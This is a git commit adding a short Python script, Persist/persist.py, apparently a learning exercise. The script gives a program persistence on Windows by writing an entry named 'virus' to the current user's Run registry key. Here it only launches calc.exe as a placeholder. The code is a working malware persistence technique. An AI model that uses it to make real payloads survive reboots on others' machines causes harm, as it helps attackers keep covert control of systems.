3ffe35e15359b9bfa4a4c3c90b3494bb0ecdfe2d
Mehdi <mehdi@mehdi-aberkane.fr>
2019-03-10 13:46:58 +0100

    add persist

---
+++ Persist/persist.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env python
+# coding: utf-8
+
+import winreg
+
+REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+def set_reg(name, value):
+    try:
+        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
+        winreg.CloseKey(registry_key)
+        return True
+    except WindowsError:
+        return False
+
+def get_reg(name):
+    try:
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
+        value, regtype = winreg.QueryValueEx(registry_key, name)
+        winreg.CloseKey(registry_key)
+        return value
+    except WindowsError:
+        return None
+
+if not get_reg("virus"):
+    set_reg("virus", "C:\Windows\System32\calc.exe")
